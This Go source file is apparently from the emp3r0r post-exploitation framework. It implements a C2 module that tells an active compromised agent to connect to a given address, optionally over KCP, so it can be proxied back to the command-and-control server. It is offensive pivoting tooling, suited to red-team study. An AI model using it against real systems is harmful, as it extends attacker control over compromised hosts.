package modules

import (
	"fmt"

	c2context "github.com/jm33-m0/emp3r0r/core/internal/cc/context"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

func moduleBring2CC(ctx *c2context.C2Context) {
	if ctx.Target == nil {
		logging.Errorf("No active agent")
		return
	}
	addrOpt, ok := ctx.Flags["addr"]
	if !ok {
		logging.Errorf("Option 'addr' not found")
		return
	}
	addr := addrOpt

	kcpOpt, ok := ctx.Flags["kcp"]
	if !ok {
		logging.Errorf("Option 'kcp' not found")
		return
	}
	use_kcp := kcpOpt

	cmd := fmt.Sprintf("%s --addr %s --kcp %s", def.C2CmdBring2CC, addr, use_kcp)
	err := CmdSender(cmd, "", ctx.Target.Tag)
	if err != nil {
		logging.Errorf("SendCmd: %v", err)
		return
	}
	logging.Infof("agent %s is connecting to %s to proxy it out to C2", ctx.Target.Tag, addr)
}
